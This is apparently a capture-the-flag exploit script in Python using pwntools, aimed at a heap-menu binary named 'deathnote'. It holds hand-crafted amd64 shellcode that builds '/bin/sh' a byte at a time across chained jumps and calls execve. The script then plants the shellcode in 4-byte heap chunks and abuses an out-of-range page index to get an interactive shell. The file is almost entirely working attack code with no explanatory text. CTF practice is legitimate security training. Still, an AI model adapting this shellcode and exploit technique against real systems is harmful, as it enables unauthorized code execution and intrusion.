from pwn import *
p = process("./deathnote")
#p = remote("106.75.15.60",57343)
context.arch = 'amd64'
shellcode ='''
xor ecx,ecx
jmp $+46
xor esi,esi
jmp $+46
push rsi
nop
jmp $+46
mov cl,0x2f
jmp $+46
push rcx
nop
jmp $+46
xchg rax,rsp
jmp $+46
add al,9
jmp $+46
xchg rax,rsp
jmp $+46
mov cl,0x62
jmp $+46
push rcx
nop
jmp $+46
xchg rax,rsp
jmp $+46
add al,9
jmp $+46
xchg rax,rsp
jmp $+46
mov cl,0x69
jmp $+46
push rcx
nop
jmp $+46
xchg rax,rsp
jmp $+46
add al,9
jmp $+46
xchg rax,rsp
jmp $+46
mov cl,0x6e
jmp $+46
push rcx
nop
jmp $+46
xchg rax,rsp
jmp $+46
add al,9
jmp $+46
xchg rax,rsp
jmp $+46
mov cl,0x2f
jmp $+46
push rcx
nop
jmp $+46
xchg rax,rsp
jmp $+46
add al,9
jmp $+46
xchg rax,rsp
jmp $+46
mov cl,0x73
jmp $+46
push rcx
nop
jmp $+46
xchg rax,rsp
jmp $+46
add al,9
jmp $+46
xchg rax,rsp
jmp $+46
mov cl,0x68
jmp $+46
push rcx
nop
jmp $+46
xchg rax,rsp
jmp $+46
add al,9
jmp $+46
xchg rax,rsp
jmp $+46
mov cl,0
jmp $+46
push rcx
nop
jmp $+46
xchg rax,rsp
jmp $+46
add al,9
jmp $+46
xchg rax,rsp
jmp $+46
xor esi,esi
jmp $+46
xchg rax,rsp
jmp $+46
sub al,0x10
jmp $+46
xchg rax,rsp
jmp $+46
push rsp
pop rdi
jmp $+46
push   0x3b
jmp $+46
pop rax
nop
jmp $+46
xor edx,edx
jmp $+46
syscall

'''
sc = asm(shellcode) + "\n"
def add(page,size,content):
    p.sendlineafter("choice>>","1")
    p.sendlineafter("Page:",str(page))
    p.sendlineafter("Size:",str(size))
    p.sendafter("Name:",content)
def delete(page):
    p.sendlineafter("choice>>","2")
    p.sendlineafter("Page:",str(page))

gdb.attach(p)
p.sendlineafter("name:","test")
add(1,0x10,"test")
init = sc[:4]
sc = sc[4:]
while sc:
    add(0,0x10,sc[:4])
    sc = sc[4:]
delete(1)
raw_input()
add(4294967271,0x10,init)




p.interactive()

